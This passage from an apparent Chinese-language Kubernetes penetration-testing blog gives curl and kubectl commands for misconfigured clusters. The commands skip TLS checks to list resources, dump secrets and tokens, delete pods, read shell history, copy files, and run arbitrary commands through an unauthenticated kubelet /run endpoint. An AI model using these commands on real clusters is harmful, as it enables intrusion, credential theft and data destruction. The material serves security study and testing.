    <span class="token string">"/readyz/poststarthook/bootstrap-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/crd-informer-synced"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/generic-apiserver-start-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/kube-apiserver-autoregistration"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/max-in-flight-filter"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/rbac/bootstrap-roles"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/scheduling/bootstrap-system-priority-classes"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/start-apiextensions-controllers"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/start-apiextensions-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/start-cluster-authentication-info-controller"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/start-kube-aggregator-informers"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/poststarthook/start-kube-apiserver-admission-initializer"</span><span class="token punctuation">,</span>
    <span class="token string">"/readyz/shutdown"</span><span class="token punctuation">,</span>
    <span class="token string">"/version"</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>同理，针对6443端口的curl、kubectl渗透，只需要添加相应的忽略证书验证即可，如果直接访问则会显示访问认证失败</p>
<pre><code>λ Qftm &gt;&gt;&gt;: kubectl -s https://114.67.127.255:6443 get pods
Please enter Username: a
Please enter Password: Unable to connect to the server: x509: certificate signed by unknown authority</code></pre><h4 id="curl-1"><a href="#curl-1" class="headerlink" title="curl"></a>curl</h4><p><code>&lt;-k&gt;</code> 忽略HTTPS证书校验（允许不使用证书到SSL站点）</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get api</span>
curl -k https://ip:6443

<span class="token comment" spellcheck="true"># get pods</span>
curl -k https://ip:6443/api/v1/pods

<span class="token comment" spellcheck="true"># get services</span>
curl -k https://ip:6443/api/v1/services

<span class="token comment" spellcheck="true"># get namespaces</span>
curl -k https://ip:6443/api/v1/namespaces

<span class="token comment" spellcheck="true"># get namespaces:default pods</span>
curl -k https://ip:6443/api/v1/namespaces/default/pods

<span class="token comment" spellcheck="true"># get namespaces:default/pods:myapp</span>
curl -k https://ip:6443/api/v1/namespaces/default/pods/myapp

<span class="token comment" spellcheck="true"># get namespaces:default 守护进程</span>
curl -k https://ip:6443/api/v1/namespaces/default/daemonsets

<span class="token comment" spellcheck="true"># get namespaces:default services</span>
curl -k https://ip:6443/api/v1/namespaces/default/services

<span class="token comment" spellcheck="true"># get namespaces:default secrets</span>
curl -k https://ip:6443/api/v1/namespaces/default/secrets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="kubectl-2"><a href="#kubectl-2" class="headerlink" title="kubectl"></a>kubectl</h4><p><code>&lt;--insecure-skip-tls-verify=true&gt;</code> 忽略HTTPS证书校验（允许不使用证书到SSL站点）</p>
<ul>
<li>Get node info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get all nodes</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get no
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get node
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get nodes
<span class="token comment" spellcheck="true"># response</span>
NAME STATUS ROLES AGE VERSION

<span class="token comment" spellcheck="true"># get all nodes (more field information)</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get nodes -o wide
<span class="token comment" spellcheck="true"># response</span>
NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Get namespace info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get all namespaces</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get ns
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get namespace
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get namespaces
<span class="token comment" spellcheck="true"># response</span>
NAME STATUS AGE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Get pod info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get pods in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get po -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pod -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pods -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
<span class="token comment" spellcheck="true"># response</span>
NAME READY STATUS RESTARTS AGE

<span class="token comment" spellcheck="true"># get pods in a specific namespace (more field information)</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pods -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o wide
<span class="token comment" spellcheck="true"># response</span>
NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES

<span class="token comment" spellcheck="true"># get pods in the default namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pods
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pods -n default

<span class="token comment" spellcheck="true"># get pods in all namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pods -A
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pods --all-namespaces<span class="token operator">=</span>true
<span class="token comment" spellcheck="true"># response</span>
NAMESPACE NAME READY STATUS RESTARTS AGE

<span class="token comment" spellcheck="true"># get the describe information of pod in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true describe pod/<span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true describe pods/<span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>

<span class="token comment" spellcheck="true"># get detailed information(json) of pod in a specific namespace</span>
kubectl <span class="token function">command</span> <span class="token punctuation">(</span>TYPE NAME <span class="token operator">|</span> TYPE/NAME<span class="token punctuation">)</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pod/<span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o json
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pods/<span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o json
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pods <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o json
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pods <span class="token operator">&lt;</span>pod1<span class="token operator">></span> <span class="token operator">&lt;</span>pod2<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o json

<span class="token comment" spellcheck="true"># get detailed information(yaml) of pod in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get pods <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o yaml

<span class="token comment" spellcheck="true"># get the log information of pod in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true logs -f --tail <span class="token operator">&lt;</span>count<span class="token operator">></span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span>

<span class="token comment" spellcheck="true"># delete pod in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true delete pods <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Get serviceaccounts info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get serviceaccounts in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get sa -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get serviceaccount -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get serviceaccounts -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
<span class="token comment" spellcheck="true"># response</span>
NAME SECRETS AGE

<span class="token comment" spellcheck="true"># get serviceaccounts in the default namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get sa
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get sa -n default

<span class="token comment" spellcheck="true"># get serviceaccounts in all namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get sa -A
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get sa --all-namespaces<span class="token operator">=</span>true
<span class="token comment" spellcheck="true"># response</span>
NAMESPACE NAME SECRETS AGE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>get secret info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get secrets in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get secret -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get secrets -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
<span class="token comment" spellcheck="true"># response</span>
NAME TYPE DATA AGE

<span class="token comment" spellcheck="true"># get secrets in the default namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get secrets
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get secrets -n default

<span class="token comment" spellcheck="true"># get secrets in all namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get secrets -A
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get secrets --all-namespaces<span class="token operator">=</span>true
<span class="token comment" spellcheck="true"># response</span>
NAMESPACE NAME TYPE DATA AGE

<span class="token comment" spellcheck="true"># get the describe information of secret in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true describe secret/<span class="token operator">&lt;</span>secret<span class="token operator">></span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true describe secrets/<span class="token operator">&lt;</span>secret<span class="token operator">></span>

<span class="token comment" spellcheck="true"># get detailed information(json) of secret in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o json

<span class="token comment" spellcheck="true"># get detailed information(yaml) of secret in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o yaml

<span class="token comment" spellcheck="true"># get specific field information of secret in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o jsonpath<span class="token operator">=</span><span class="token string">'{}'</span>

<span class="token comment" spellcheck="true"># get specific field information of secret in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o jsonpath<span class="token operator">=</span><span class="token string">'{.data}'</span>

<span class="token comment" spellcheck="true"># get specific field information of secret in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o jsonpath<span class="token operator">=</span><span class="token string">'{.data.token}'</span>

<span class="token comment" spellcheck="true"># delete secret in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true delete secrets <span class="token operator">&lt;</span>secret<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Get services info</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># get services in a specific namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get svc -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get <span class="token function">service</span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get services -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span>
<span class="token comment" spellcheck="true"># response</span>
NAME TYPE CLUSTER-IP EXTERNAL-IP PORT<span class="token punctuation">(</span>S<span class="token punctuation">)</span> AGE

<span class="token comment" spellcheck="true"># get services in a specific namespace (more field information)</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get services -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -o wide
<span class="token comment" spellcheck="true"># response</span>
NAME TYPE CLUSTER-IP EXTERNAL-IP PORT<span class="token punctuation">(</span>S<span class="token punctuation">)</span> AGE SELECTOR

<span class="token comment" spellcheck="true"># get services in the default namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get services
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get services -n default

<span class="token comment" spellcheck="true"># get services in all namespace</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get services -A
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true get services --all-namespaces<span class="token operator">=</span>true
<span class="token comment" spellcheck="true"># response</span>
NAMESPACE NAME TYPE CLUSTER-IP EXTERNAL-IP PORT<span class="token punctuation">(</span>S<span class="token punctuation">)</span> AGE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Exec command</li>
</ul>
<p>当仅只有一个container时，可不指定&lt;-c,container&gt;参数，工具会自动识别带上；如果存在多个container，则必须指定一个特定容器才能执行命令</p>
<pre class="line-numbers language-bash"><code class="language-bash">Usage:
  kubectl <span class="token function">exec</span> <span class="token punctuation">(</span>POD <span class="token operator">|</span> TYPE/NAME<span class="token punctuation">)</span> <span class="token punctuation">[</span>-n NAMESPACE<span class="token punctuation">]</span> <span class="token punctuation">[</span>-c CONTAINER<span class="token punctuation">]</span> <span class="token punctuation">[</span>flags<span class="token punctuation">]</span> -- COMMAND <span class="token punctuation">[</span>args<span class="token punctuation">..</span>.<span class="token punctuation">]</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># execute commands in the namespace.pod.container</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> -- <span class="token operator">&lt;</span>command<span class="token operator">></span> <span class="token punctuation">[</span>args<span class="token punctuation">..</span>.<span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># execute 'pwd' in the namespace.pod.container</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> <span class="token function">pwd</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> <span class="token function">pwd</span>

<span class="token comment" spellcheck="true"># exec namespace.pod.container ls</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> <span class="token function">ls</span>

<span class="token comment" spellcheck="true"># exec namespace.pod.container ls -al /root</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> -- <span class="token function">ls</span> -al /root

<span class="token comment" spellcheck="true"># exec namespace.pod.container cat /root/.bash_history</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true <span class="token function">exec</span> <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> -- <span class="token function">cat</span> /root/.bash_history

<span class="token comment" spellcheck="true"># exec namespace.pod.container bash</span>
kubectl -s https://ip:6443 --insecure-skip-tls-verify<span class="token operator">=</span>true <span class="token function">exec</span> -it <span class="token operator">&lt;</span>pod<span class="token operator">></span> -n <span class="token operator">&lt;</span>namespace<span class="token operator">></span> -c <span class="token operator">&lt;</span>container<span class="token operator">></span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>File move</li>
</ul>
<p>如果pod存在多个container，则必须指定&lt;-c, container=&gt;参数</p>
<pre><code>Usage:
  kubectl cp &lt;file-spec-src&gt; &lt;file-spec-dest&gt; [options]

# download file
kubectl -s https://ip:6443 --insecure-skip-tls-verify=true cp &lt;namespace&gt;/&lt;pod&gt;:/xxx/test.txt ./test.txt -c &lt;container&gt;

# upload file
kubectl -s https://ip:6443 --insecure-skip-tls-verify=true cp ./test.txt &lt;namespace&gt;/&lt;pod&gt;:/xxx/test.txt -c &lt;container&gt;</code></pre><h3 id="Platform"><a href="#Platform" class="headerlink" title="Platform"></a>Platform</h3><p>集群 <code>Kubernetes</code> 常见的管理平台有：<code>Kubernetes Dashboard</code>、<code>Rancher</code> 等；针对集群管理平台的攻击常见手法为：未授权（e.g: <code>--enable-skip-login</code>等）、弱口令、认证泄露等。</p>
<h2 id="Attack-Kubelet"><a href="#Attack-Kubelet" class="headerlink" title="Attack Kubelet"></a>Attack Kubelet</h2><p>Kubernetes 集群每一个 Worker Node 节点都运行了一个 kubelet 服务，其监听了10250，10248，10255 等端口。其中 10250 HTTPS 端口是 kubelet 与 kube-apiserver 进行通信的主要端口。</p>
<p>在 Kubernetes v1.5 版本之前 10250 端口不存在鉴权认证，导致攻击者可以通过10250端口未授权操作集群Pod，从 <a href="https://github.com/kubernetes/kubernetes/blob/ea0764452222146c47ec826977f49d7001b0ea8c/CHANGELOG/CHANGELOG-1.5.md#changelog-since-v150" target="_blank" rel="noopener">v1.5</a> 版本开始 <code>anonymous-auth</code> 参数默认值为 <code>false</code> 即默认开启认证。</p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20211203174927-164735412549211.png" alt="image-20211203174927"></p>
<p>PS：如果手动设置 <code>anonymous-auth: True</code> 开启匿名访问，则存在未授权访问的风险。</p>
<p>kubelet API 信息：<code>/pkg/kubelet/server/server.go</code></p>
<table>
<thead>
<tr>
<th>API</th>
<th>Method</th>
<th>Examples</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>/pods</td>
<td>GET</td>
<td><code>/pods</code></td>
<td>List the pods in the kubelet’s worker node</td>
</tr>
<tr>
<td>/run</td>
<td>POST</td>
<td><code>/run/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;containerName</code><br><code>/run/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;uid&gt;/&lt;containerName&gt;</code><br>Data: <code>cmd=&lt;command&gt;</code></td>
<td>Run command in a container</td>
</tr>
<tr>
<td>/exec</td>
<td>GET</td>
<td><code>/exec/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;containerName&gt;?command=&lt;command</code><br><code>/exec/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;uid&gt;/&lt;containerName&gt;?command=&lt;command&gt;</code></td>
<td>Run command using a stream in a container</td>
</tr>
<tr>
<td>—</td>
<td>—</td>
<td>—</td>
<td>—</td>
</tr>
</tbody></table>
<p>对于命令执行接口需要注意 <code>/run</code> 和 <code>/exec</code> 接口的区别：<code>run</code> 接口直接返回字节类型的结果，不存在可交互的shell、<code>exec</code> 接口通过流的方式传递结果及提供tty模式的交互，可得到交互的shell</p>
<pre class="line-numbers language-go"><code class="language-go"><span class="token comment" spellcheck="true">// RunInContainer synchronously executes the command in the container, and returns the output.</span>
<span class="token comment" spellcheck="true">// If the command completes with a non-0 exit code, a k8s.io/utils/exec.ExitError will be returned.</span>
<span class="token function">RunInContainer</span><span class="token punctuation">(</span>id ContainerID<span class="token punctuation">,</span> cmd <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> timeout time<span class="token punctuation">.</span>Duration<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">// ExecInContainer executes a command in a container in the pod, copying data</span>
<span class="token comment" spellcheck="true">// between in/out/err and the container's stdin/stdout/stderr.</span>
<span class="token function">ExecInContainer</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span> uid types<span class="token punctuation">.</span>UID<span class="token punctuation">,</span> container <span class="token builtin">string</span><span class="token punctuation">,</span> cmd <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> in io<span class="token punctuation">.</span>Reader<span class="token punctuation">,</span> out<span class="token punctuation">,</span> err io<span class="token punctuation">.</span>WriteCloser<span class="token punctuation">,</span> tty <span class="token builtin">bool</span><span class="token punctuation">,</span> resize <span class="token operator">&lt;-</span><span class="token keyword">chan</span> remotecommand<span class="token punctuation">.</span>TerminalSize<span class="token punctuation">,</span> timeout time<span class="token punctuation">.</span>Duration<span class="token punctuation">)</span> <span class="token builtin">error</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>除此之外有一点比较有意思，2016年有关开发者提出合并 <code>/run</code> 和 <code>/exec</code> 接口（Remove RunInContainer()），同时合并分支测试与构建都通过了，但是后来有人反馈了bug，最终合并分支被移除</p>
<ul>
<li><a href="https://github.com/kubernetes/kubernetes/issues/24689" target="_blank" rel="noopener">Merge RunInContainer and ExecInContainer in kubelet’s runtime interface</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/24921" target="_blank" rel="noopener">Remove RunInContainer interface in Kubelet Runtime interface</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/831203c19b5016bd5248bed47751425db197b604" target="_blank" rel="noopener">Commit, Remove RunInContainer interface in Kuberlete Runtime interface</a></li>
</ul>
<p><img src="/2021/08/15/Kubernetes-Security/image-20220309134304325-164735412549212.png" alt="image-20220309134304325"></p>
<h3 id="Port-10250"><a href="#Port-10250" class="headerlink" title="Port 10250"></a>Port 10250</h3><p>Kubelet 10250若不存在认证，访问 <a href="https://x.x.x.x:10250/pods" target="_blank" rel="noopener">https://x.x.x.x:10250/pods</a> 会返回集群相应Node节点 Pod 列表，如下图所示</p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20211206151416366-164735412549213.png" alt="image-20211206151416366"></p>
<p>这里有了 pod 及容器等信息，就可以通过 <code>curl</code> 或 <code>kubeletctl</code> 在任意 pod 的特定容器里面执行命令。</p>
<h4 id="curl-2"><a href="#curl-2" class="headerlink" title="curl"></a>curl</h4><p>构造curl请求格式如下，即可在对应的容器里执行任意命令：</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># -k 忽略10250端口https证书校验</span>
curl -k <span class="token string">"https://node_ip:10250/run/&lt;NAMESPACE>/&lt;POD>/&lt;CONTAINER>"</span> -d <span class="token string">"cmd=[COMMAND]"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>那么，如何获取集群Node节点Pod的 <code>NAMESPACE</code>、<code>POD</code>、<code>CONTAINER</code> 参数值呢？访问 <code>/pods</code> 接口，通过响应的json数据查看selfLink键值，可以获取 <code>NAMESPACE</code>和<code>POD</code>值，然后通过 <code>containers-&gt;number-&gt;name</code> 键值，可以获取<code>CONTAINER</code> 值。</p>
<p><img src="/2021/08/15/Kubernetes-Security/bc503eb10f01e189-164735412549214.png" alt="img"></p>
<p>注意容器 <code>status-&gt;phase</code> 键值的状态，只有<code>running</code>状态下的容器才可以调用访问执行任意命令。</p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20211206163238613-164735412549215.png" alt="image-20211206163238613"></p>
<p>PS：<code>exec</code> 接口涉及协议升级切换</p>
<h4 id="kubeletctl"><a href="#kubeletctl" class="headerlink" title="kubeletctl"></a>kubeletctl</h4><ul>
<li>kubelet 远端管理工具 <a href="https://github.com/cyberark/kubeletctl" target="_blank" rel="noopener">kubeletctl</a> </li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">λ  Qftm <span class="token operator">>></span><span class="token operator">></span>:kubeletctl -h
Description:
  kubeletctl is <span class="token function">command</span> line utility that implements kuebelt<span class="token string">'s API.
  It also provides scanning for opened kubelet APIs and search for potential RCE on containers.

